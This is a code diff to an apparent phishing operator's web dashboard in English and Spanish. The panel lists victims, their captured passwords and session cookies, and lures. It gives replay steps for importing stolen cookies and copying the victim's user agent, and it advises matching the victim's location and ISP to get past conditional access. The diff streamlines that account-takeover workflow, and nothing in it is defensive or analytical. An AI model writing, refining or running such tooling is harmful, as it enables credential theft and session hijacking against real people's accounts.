@@ -109,7 +109,7 @@
 
   .stage { flex: 1; display: grid; grid-template-rows: 1fr minmax(280px, 44vh); min-height: 0; }
   .tablewrap { overflow: auto; }
-  table { border-collapse: collapse; width: 100%; min-width: 720px; }
+  table { border-collapse: collapse; width: 100%; min-width: 520px; }
   thead th {
     position: sticky; top: 0; background: var(--bg);
     color: var(--mute); font-weight: 500; font-size: 12px;
@@ -274,22 +274,20 @@
 </header>
 
 <nav class="rail">
-  <button type="button" data-tab="dash"></button>
   <button type="button" class="on" data-tab="victims"></button>
   <button type="button" data-tab="sessions"></button>
   <button type="button" data-tab="lures"></button>
-  <button type="button" data-tab="urls"></button>
   <button type="button" data-tab="settings"></button>
-  <div class="hint">? keys</div>
+  <div class="hint">? · c u</div>
 </nav>
 
 <main>
   <div class="dombar" id="domains"></div>
   <div class="toolbar" id="toolbar">
-    <select id="fphishlet"></select>
+    <select id="fphishlet" hidden></select>
     <label class="chk" id="finboxwrap"><input type="checkbox" id="finbox" checked> <span id="finbox_l"></span></label>
-    <label class="chk"><input type="checkbox" id="fvalid" checked> <span id="fvalid_l"></span></label>
-    <label class="chk" id="fnoisewrap"><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
+    <label class="chk" id="fvalidwrap" hidden><input type="checkbox" id="fvalid" checked> <span id="fvalid_l"></span></label>
+    <label class="chk" id="fnoisewrap" hidden><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
     <span class="count" id="count"></span>
   </div>
   <div class="stage" id="stage">
@@ -327,9 +325,9 @@ const I18N = {
     loot_t:"Cookies of every replayable account", csv_t:"Masked session CSV for the report",
     tab_dash:"Dashboard", tab_victims:"Inbox", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
     domains:"Hosts", all_phishlets:"All phishlets", only_valid:"Replayable only", show_noise:"Include visits with no login",
-    inbox_only:"Inbox", th_status:"Status",
-    st_inbox:"inbox", st_copied:"copied", st_replayed:"replayed", st_bounced:"bounced", st_done:"done",
-    empty_inbox:"Inbox is clear. Uncheck Inbox to see closed accounts.",
+    inbox_only:"Open only", th_status:"Status", th_from:"From",
+    st_inbox:"open", st_copied:"open", st_replayed:"open", st_bounced:"bounced", st_done:"done",
+    empty_inbox:"Nothing open. Uncheck “Open only” to see closed accounts.",
     th_user:"Account", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Seen", th_pass:"Password", th_captured:"Captured", th_expires:"Expires",
     th_target:"Target", th_lure_id:"Lure",
@@ -370,9 +368,9 @@ const I18N = {
     sb_off:'Safe Browsing off',
     flagged:"flagged", mip_title:n=>`same account from ${n} IPs — cookie may bounce on conditional access`,
     ago:(n,u)=>`${n}${u} ago`,
-    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} inbox</b> · ${r} replayable · ${p} accounts · ${h} captures · ${st} · ${last}`,
+    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} open</b> · ${st} · ${last}`,
     help_title:"Keys",
-    help_items:[["/","search"],["1–6","switch view"],["j k","move"],["c","copy cookies"],["b","copy replay brief"],["h","copy Cookie header"],["u","mark done"],["e","mark bounced"],["r","refresh"],["?","this list"],["esc","close"]],
+    help_items:[["/","search"],["j k","move"],["c","copy cookies"],["u","done"],["e","bounced"],["?","this list"]],
     tokens:"Tokens", password:"Password", copy_user:"Copy account",
     replay_title:"Replay (manual)", replay_match:"Match the victim",
     replay_import:"Import cookies on", replay_then:"Then open", replay_avoid:"Do not use",
@@ -398,9 +396,9 @@ const I18N = {
     loot_t:"Cookies de cada cuenta rejugable", csv_t:"CSV enmascarado para el informe",
     tab_dash:"Dashboard", tab_victims:"Bandeja", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
     domains:"Hosts", all_phishlets:"Todos los phishlets", only_valid:"Solo rejugables", show_noise:"Incluir visitas sin login",
-    inbox_only:"Bandeja", th_status:"Estado",
-    st_inbox:"bandeja", st_copied:"copiada", st_replayed:"rejugada", st_bounced:"rebotó", st_done:"hecha",
-    empty_inbox:"Bandeja vacía. Quita Bandeja para ver las cuentas cerradas.",
+    inbox_only:"Solo pendientes", th_status:"Estado", th_from:"Desde",
+    st_inbox:"pendiente", st_copied:"pendiente", st_replayed:"pendiente", st_bounced:"rebotó", st_done:"hecha",
+    empty_inbox:"Nada pendiente. Quita “Solo pendientes” para ver el resto.",
     th_user:"Cuenta", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Visto", th_pass:"Password", th_captured:"Capturado", th_expires:"Caduca",
     th_target:"Servicio", th_lure_id:"Lure",
@@ -441,9 +439,9 @@ const I18N = {
     sb_off:'Safe Browsing off',
     flagged:"flaggeado", mip_title:n=>`misma cuenta desde ${n} IPs — la cookie puede rebotar por conditional access`,
     ago:(n,u)=>`hace ${n}${u}`,
-    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} bandeja</b> · ${r} rejugables · ${p} cuentas · ${h} capturas · ${st} · ${last}`,
+    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} pendientes</b> · ${st} · ${last}`,
     help_title:"Teclas",
-    help_items:[["/","buscar"],["1–6","cambiar vista"],["j k","mover"],["c","copiar cookies"],["b","copiar briefing"],["h","copiar cabecera Cookie"],["u","marcar hecha"],["e","marcar rebotó"],["r","actualizar"],["?","esta lista"],["esc","cerrar"]],
+    help_items:[["/","buscar"],["j k","mover"],["c","copiar cookies"],["u","hecha"],["e","rebotó"],["?","esta lista"]],
     tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
     replay_title:"Replay (manual)", replay_match:"Igualar a la víctima",
     replay_import:"Importar cookies en", replay_then:"Luego abrir", replay_avoid:"No uses",
@@ -479,11 +477,13 @@ const state = {
   sort: { key: 'update', dir: -1 }, auto: false, timer: null, knownIds: new Set(), firstLoad: true, sig: '',
   sel: null, rows: [], revealed: new Set(), period: 'week',
 };
-const STATUSES = ['inbox', 'copied', 'replayed', 'bounced', 'done'];
+const STATUSES = ['inbox', 'bounced', 'done'];
 function victimStatus(user) {
   const st = (window._vstate || {})[String(user || '').toLowerCase()] || {};
-  if (st.status) return st.status;
-  return st.used ? 'done' : 'inbox';
+  let s = st.status || (st.used ? 'done' : 'inbox');
+  if (s === 'copied' || s === 'replayed') s = 'inbox';
+  if (!STATUSES.includes(s)) s = 'inbox';
+  return s;
 }
 function inInbox(v) {
   if (!v || !v.valid) return false;
@@ -556,35 +556,36 @@ function replayBrief(s) {
   ];
   return lines.filter(x => x !== '').join('\n').replace(/\n{3,}/g, '\n\n');
 }
+function fromLine(s) {
+  if (!s) return '—';
+  const cc = s.geo && s.geo.country_code;
+  const city = s.geo && s.geo.city;
+  const ua = s.replay && s.replay.ua_summary;
+  const bits = [cc, city, ua].filter(Boolean);
+  return bits.length ? bits.join(' · ') : (s.remote_addr || '—');
+}
 function replayBox(s) {
   if (!s) return '';
   const r = s.replay || {};
-  const g = s.geo;
-  const net = g ? [g.asn, g.isp].filter(Boolean).join(' · ') : '';
-  const geo = g && g.country ? locLine(s) : (s.remote_addr ? esc(s.remote_addr) + ' · <span class="mut">' + t('replay_geo_wait') + '</span>' : '—');
+  const g = s.geo || {};
+  const loc = g.country ? locLine(s) : esc(s.remote_addr || t('replay_geo_wait'));
+  const net = [g.asn, g.isp].filter(Boolean).join(' · ');
   return `<div class="replay">
-    <h3>${t('replay_title')}</h3>
-    <div class="mut">${esc(r.label || '')}${s.persistent ? ' · persist' : ''} · ${ttlCell(s)}</div>
+    <div class="u">${esc(r.label || '—')}${s.persistent ? ' · persist' : ''}</div>
+    <div class="v" style="margin:6px 0 10px">${loc}<br>${esc(r.ua_summary || '')}${net ? '<br><span class="mut">'+esc(net)+'</span>' : ''}</div>
     <ol class="steps">
-      <li>${t('replay_import')}: <a href="${esc(r.import_on || '#')}" target="_blank" rel="noreferrer">${esc(r.import_on || '—')}</a></li>
-      <li>${t('replay_then')}: <a href="${esc(r.then_open || '#')}" target="_blank" rel="noreferrer">${esc(r.then_open || '—')}</a></li>
-      ${r.avoid ? `<li class="warn">${t('replay_avoid')}: ${esc(r.avoid)}</li>` : ''}
+      <li>${t('replay_import')} <b>${esc((r.import_on || '').replace(/^https:\/\//,''))}</b></li>
+      <li>${t('replay_then')} <b>${esc((r.then_open || '').replace(/^https:\/\//,''))}</b></li>
+      ${r.avoid ? `<li class="warn">${t('replay_avoid')} ${esc(r.avoid)}</li>` : ''}
     </ol>
-    <div class="k">${t('replay_match')}</div>
-    <div class="v">${geo}</div>
-    <div class="v mut">${esc(net)}</div>
-    <div class="v">${esc(s.remote_addr || '')}${g && g.timezone ? ' · ' + esc(g.timezone) : ''}</div>
-    <div class="v">${esc(r.ua_summary || '')}</div>
-    <div class="k" style="margin-top:8px">${t('replay_headers')}</div>
-    <div class="hdr">User-Agent <span class="hint">(${t('replay_captured')})</span><br>${esc(s.useragent || '—')}</div>
-    ${r.accept_lang ? `<div class="hdr">Accept-Language <span class="hint">(${t('replay_suggested')})</span><br>${esc(r.accept_lang)}</div>` : ''}
-    <div class="insp-actions" style="margin:10px 0 0">
+    <div class="insp-actions" style="margin:4px 0 8px">
+      ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
       ${s.useragent ? `<button class="btn" data-copytext="${esc(s.useragent)}">${t('replay_copy_ua')}</button>` : ''}
-      ${r.accept_lang ? `<button class="btn" data-copytext="${esc(r.accept_lang)}">${t('replay_copy_al')}</button>` : ''}
-      ${s.cookies ? `<button class="btn" data-copyhdr="${s.id}">${t('replay_copy_hdr')}</button>` : ''}
-      <button class="btn" data-copybrief="${s.id}">${t('replay_copy_brief')}</button>
+      ${s.cookies ? `<button class="btn" data-copyhdr="${s.id}">Cookie</button>` : ''}
     </div>
-    <div class="hint" style="margin-top:8px">${t('replay_vpn')}</div>
+    <div class="hdr">${esc(s.useragent || '—')}</div>
+    ${r.accept_lang ? `<div class="hdr mut">${esc(r.accept_lang)} <span class="hint">Accept-Language</span></div>` : ''}
+    ${s.password ? `<div style="margin-top:8px">${t('th_pass')} ${passCell(s.password, 's:' + s.id)}</div>` : ''}
   </div>`;
 }
 function ttlCell(s) {
@@ -646,17 +647,16 @@ function applyStatic() {
   $('#loot').textContent = t('loot'); $('#loot').title = t('loot_t');
   $('#csv').textContent = t('csv'); $('#csv').title = t('csv_t');
   $('#langbtn').textContent = LANG === 'en' ? 'ES' : 'EN';
-  document.querySelector('[data-tab="dash"]').textContent = t('tab_dash');
-  document.querySelector('[data-tab="victims"]').textContent = t('tab_victims');
-  document.querySelector('[data-tab="sessions"]').textContent = t('tab_sessions');
-  document.querySelector('[data-tab="lures"]').textContent = t('tab_lures');
-  document.querySelector('[data-tab="urls"]').textContent = t('tab_urls');
-  document.querySelector('[data-tab="settings"]').textContent = t('tab_settings');
-  $('#fvalid_l').textContent = t('only_valid');
-  $('#fnoise_l').textContent = t('show_noise');
+  const setTab = (id, key) => { const el = document.querySelector('[data-tab="'+id+'"]'); if (el) el.textContent = t(key); };
+  setTab('victims', 'tab_victims');
+  setTab('sessions', 'tab_sessions');
+  setTab('lures', 'tab_lures');
+  setTab('settings', 'tab_settings');
+  if ($('#fvalid_l')) $('#fvalid_l').textContent = t('only_valid');
+  if ($('#fnoise_l')) $('#fnoise_l').textContent = t('show_noise');
   $('#finbox_l').textContent = t('inbox_only');
   $('#finbox').checked = state.inbox;
-  $('#fvalid').checked = state.onlyValid;
+  if ($('#fvalid')) $('#fvalid').checked = state.onlyValid;
   $('#help_title').textContent = t('help_title');
   $('#help_dl').innerHTML = t('help_items').map(([k, v]) => `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`).join('');
 }
@@ -738,7 +738,7 @@ function render() {
   if (tab === 'urls') { renderUrls(); return; }
   if (tab === 'settings') { renderSettings(); return; }
   if (tab === 'lures') { renderLures(); return; }
-  $('#fnoisewrap').style.display = tab === 'sessions' ? '' : 'none';
+  if ($('#fnoisewrap')) $('#fnoisewrap').style.display = 'none';
   $('#finboxwrap').style.display = tab === 'victims' ? '' : 'none';
   if (tab === 'victims') renderVictims(); else renderSessions();
   renderInspector();
@@ -900,18 +900,16 @@ function renderLures() {
   const rows = [...m.values()].sort((a, b) => b.valid - a.valid || b.visits - a.visits);
   $('#luresview').innerHTML =
     `<table><thead><tr>
-       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('lure_col')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th><th></th>
+       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th></th>
      </tr></thead><tbody>` +
     (rows.length ? rows.map(e => {
-      const conv = e.visits ? Math.round(e.valid / e.visits * 100) : 0;
       const tgt = lureTarget(e.sessions);
       return `<tr>
-        <td><div class="u">${esc(tgt.name)}</div>${tgt.detail ? `<div class="mut">${esc(tgt.detail)}</div>` : ''}</td>
+        <td><div class="u">${esc(tgt.name)}</div><div class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</div></td>
         <td class="num" style="color:var(--copper)">${esc(lureId(e.url))}</td>
-        <td class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</td>
-        <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td>
+        <td class="num">${e.visits}</td><td class="num">${e.valid}</td>
         <td><button class="btn" data-copyurl="${esc(e.url)}">${t('copy')}</button></td></tr>`;
-    }).join('') : `<tr><td colspan="8" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
+    }).join('') : `<tr><td colspan="5" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
 }
 
 async function loadVState() { try { window._vstate = await (await fetch('/api/vstate')).json() || {}; } catch (e) { window._vstate = {}; } }
@@ -940,24 +938,18 @@ function renderVictims() {
   const rows = sortList(filtered, getters);
   state.rows = rows.map(v => ({ type: 'victim', key: v.username.toLowerCase(), data: v }));
   $('#thead').innerHTML = th([
-    ['user', t('th_user'), true], ['status', t('th_status'), true], ['pass', t('th_pass'), true], ['phishlet', t('th_phishlet'), true], ['valid', t('th_loot'), true],
-    ['expires', t('th_expires'), true], ['', t('th_lastip'), false], ['update', t('th_seen'), true]
+    ['user', t('th_user'), true], ['valid', t('th_loot'), true], ['', t('th_from'), false], ['update', t('th_seen'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(v => {
     const st = victimStatus(v.username);
-    const ips = new Set(v.sessions.map(s => s.remote_addr).filter(Boolean));
     const sel = state.sel && state.sel.type === 'victim' && state.sel.key === v.username.toLowerCase();
     return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}">
-      <td class="u">${esc(v.username)}</td>
-      <td><span class="st ${st}">${t('st_' + st)}</span></td>
-      <td>${passCell(v.password, 'v:' + v.username.toLowerCase())}</td>
-      <td class="phl">${v.phishlets.map(esc).join(', ')}</td>
-      <td>${kindCell(v.best)}${ips.size > 1 ? `<span class="mark" title="${t('mip_title')(ips.size)}">${ips.size} IPs</span>` : ''}</td>
-      <td>${ttlCell(v.best)}</td>
-      <td class="mut">${v.best && v.best.geo && v.best.geo.country_code ? esc(v.best.geo.country_code) + ' · ' : ''}${esc(v.lastIP)}</td>
+      <td class="u">${esc(v.username)}${st !== 'inbox' ? ` <span class="st ${st}">${t('st_' + st)}</span>` : ''}</td>
+      <td>${kindCell(v.best)}</td>
+      <td class="mut">${esc(fromLine(v.best))}</td>
       <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="8" class="empty">${state.inbox ? t('empty_inbox') : t('empty_victims')}</td></tr>`;
+  }).join('') : `<tr><td colspan="4" class="empty">${state.inbox ? t('empty_inbox') : t('empty_victims')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
   if (!state.sel || !state.rows.some(r => r.type === state.sel.type && r.key === state.sel.key)) {
     state.sel = rows[0] ? { type: 'victim', key: rows[0].username.toLowerCase() } : null;
@@ -972,23 +964,17 @@ function renderSessions() {
   const rows = sortList(filtered, getters);
   state.rows = rows.map(s => ({ type: 'session', key: String(s.id), data: s }));
   $('#thead').innerHTML = th([
-    ['id', '#', true], ['phishlet', t('th_phishlet'), true], ['user', t('th_user'), true], ['pass', t('th_pass'), true],
-    ['valid', t('th_loot'), true], ['expires', t('th_expires'), true], ['cookies', t('th_cookies'), true], ['', t('th_lastip'), false], ['update', t('th_captured'), true]
+    ['user', t('th_user'), true], ['valid', t('th_loot'), true], ['', t('th_from'), false], ['update', t('th_captured'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(s => {
     const sel = state.sel && state.sel.type === 'session' && state.sel.key === String(s.id);
     return `<tr data-sel="session:${s.id}" class="${sel ? 'sel' : ''}${state.knownIds.size && !state.knownIds.has(s.id) ? ' new' : ''}">
-      <td class="num">${s.id}</td>
-      <td class="phl">${esc(s.phishlet)}</td>
-      <td>${esc(s.username) || '<span class="mut">—</span>'}</td>
-      <td>${passCell(s.password, 's:' + s.id)}</td>
+      <td>${esc(s.username) || '<span class="mut">#'+s.id+'</span>'}</td>
       <td>${kindCell(s)}</td>
-      <td>${ttlCell(s)}</td>
-      <td class="num">${s.cookies}</td>
-      <td class="mut">${s.geo && s.geo.country_code ? esc(s.geo.country_code) + ' · ' : ''}${esc(s.remote_addr)}</td>
+      <td class="mut">${esc(fromLine(s))}</td>
       <td class="mut" title="${absTime(s.update)}">${relTime(s.update)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="9" class="empty">${t('empty_sessions')}</td></tr>`;
+  }).join('') : `<tr><td colspan="4" class="empty">${t('empty_sessions')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
   if (!state.sel || !state.rows.some(r => r.type === state.sel.type && r.key === state.sel.key)) {
     state.sel = rows[0] ? { type: 'session', key: String(rows[0].id) } : null;
@@ -1010,40 +996,12 @@ function renderInspector() {
     const ips = [...new Set(v.sessions.map(s => s.remote_addr).filter(Boolean))];
     box.innerHTML = `
       <h2>${esc(v.username)}</h2>
-      <p class="sub">${kindCell(b)} · ${ttlCell(b)} · ${b ? b.cookies : 0} ${t('cookies_w')} · ${v.phishlets.map(esc).join(', ')}</p>
       <div class="wf">${STATUSES.map(s => `<button type="button" class="btn${victimStatus(v.username)===s?' on':''}" data-status="${s}" data-user="${esc(v.username)}">${t('st_'+s)}</button>`).join('')}</div>
       ${b ? replayBox(b) : ''}
-      <div class="insp-actions">
-        ${b && b.cookies ? `<button class="btn primary" data-copy="${b.id}">${t('copy_cookies')}</button>
-          <button class="btn" data-view="${b.id}">${t('view_json')}</button>
-          <button class="btn" data-ck="${b.id}">${t('view_cookies')}</button>` : ''}
-        <button class="btn" data-copyuser="${esc(v.username)}">${t('copy_user')}</button>
-      </div>
-      <div class="meta-grid">
-        <div><div class="k">${t('best_session')}</div><div class="v">#${b ? b.id : '—'} · ${b && b.token ? esc(b.token) : t('kind_none')}</div></div>
-        <div><div class="k">${t('expires_k')}</div><div class="v">${ttlCell(b)}${b && b.expires ? ' · ' + absTime(b.expires) : ''}</div></div>
-        <div><div class="k">${t('tokens')}</div><div class="v">${(b && b.tokens && b.tokens.length) ? b.tokens.map(esc).join(', ') : '—'}</div></div>
-        <div><div class="k">${t('useragent')}</div><div class="v">${esc(b && b.useragent)}</div></div>
-        <div><div class="k">${t('landing')}</div><div class="v">${esc(b && b.landing)}</div></div>
-      </div>
-      <div class="k" style="margin-bottom:4px;color:var(--faint)">${t('attempts_h')} (${v.sessions.length})</div>
-      <div class="attempts">${v.sessions.slice().sort((a, b) => b.update - a.update).map(s => `
-        <div class="a">
-          <span class="mut">#${s.id}</span>
-          <span class="phl">${esc(s.phishlet)}</span>
-          ${kindCell(s)}
-          ${ttlCell(s)}
-          <span class="num">${s.cookies}</span>
-          <span class="mut">${esc(s.remote_addr)}</span>
-          <span class="mut" title="${absTime(s.update)}">${relTime(s.update)}</span>
-          ${s.password ? passCell(s.password, 's:' + s.id) : ''}
-          ${s.cookies ? `<button class="btn" data-copy="${s.id}">${t('copy_cookies')}</button>` : ''}
-        </div>`).join('')}</div>
-      <div class="cookies-list" id="ckbox" hidden></div>
       <div class="vstate">
         <input class="notes" id="vs_notes" placeholder="${t('notes_ph')}" value="${esc(vst.notes || '')}">
         <button class="btn" id="vs_save">${t('save')}</button>
-        ${ips.length > 1 ? `<span class="mut">IPs: ${ips.map(esc).join(', ')}</span>` : ''}
+        ${ips.length > 1 ? `<span class="mut">${ips.size} IPs</span>` : ''}
       </div>`;
     const save = $('#vs_save');
     if (save) save.onclick = () => setVictimStatus(v.username, victimStatus(v.username), $('#vs_notes').value);
@@ -1054,22 +1012,7 @@ function renderInspector() {
   const s = row.data;
   box.innerHTML = `
     <h2>${esc(s.username) || '#' + s.id}</h2>
-    <p class="sub">#${s.id} · ${esc(s.phishlet)} · ${kindCell(s)} · ${ttlCell(s)} · ${s.token ? esc(s.token) : t('kind_none')}</p>
-    ${replayBox(s)}
-    <div class="insp-actions">
-      ${s.cookies ? `<button class="btn primary" data-copy="${s.id}">${t('copy_cookies')}</button>
-        <button class="btn" data-view="${s.id}">${t('view_json')}</button>
-        <button class="btn" data-ck="${s.id}">${t('view_cookies')}</button>` : ''}
-      ${s.username ? `<button class="btn" data-copyuser="${esc(s.username)}">${t('copy_user')}</button>` : ''}
-    </div>
-    <div class="meta-grid">
-      <div><div class="k">${t('tokens')}</div><div class="v">${(s.tokens && s.tokens.length) ? s.tokens.map(esc).join(', ') : '—'}</div></div>
-      <div><div class="k">${t('expires_k')}</div><div class="v">${ttlCell(s)}${s.expires ? ' · ' + absTime(s.expires) : ''}</div></div>
-      <div><div class="k">${t('password')}</div><div class="v">${passCell(s.password, 's:' + s.id)}</div></div>
-      <div><div class="k">${t('useragent')}</div><div class="v">${esc(s.useragent)}</div></div>
-      <div><div class="k">${t('landing')}</div><div class="v">${esc(s.landing)}</div></div>
-    </div>
-    <div class="cookies-list" id="ckbox" hidden></div>`;
+    ${replayBox(s)}`;
 }
 
 async function copyCookieHeader(id) {
@@ -1093,11 +1036,6 @@ async function copyCookies(id) {
     const arr = await r.json();
     await navigator.clipboard.writeText(JSON.stringify(arr, null, 2));
     toast(t('copied_paste')(id));
-    const row = currentSel();
-    if (row && row.type === 'victim') {
-      const st = victimStatus(row.data.username);
-      if (st === 'inbox') await setVictimStatus(row.data.username, 'copied', undefined, true);
-    }
   } catch (e) { toast(t('error') + ': ' + e); }
 }
 async function showCookies(id) {
@@ -1339,8 +1277,8 @@ document.addEventListener('keydown', e => {
   }
   if (e.key === 'j' || e.key === 'ArrowDown') { e.preventDefault(); moveSel(1); return; }
   if (e.key === 'k' || e.key === 'ArrowUp') { e.preventDefault(); moveSel(-1); return; }
-  if (e.key >= '1' && e.key <= '6') {
-    state.tab = ['dash', 'victims', 'sessions', 'lures', 'urls', 'settings'][+e.key - 1];
+  if (e.key >= '1' && e.key <= '4') {
+    state.tab = ['victims', 'sessions', 'lures', 'settings'][+e.key - 1];
     state.sel = null; render();
   }
 });
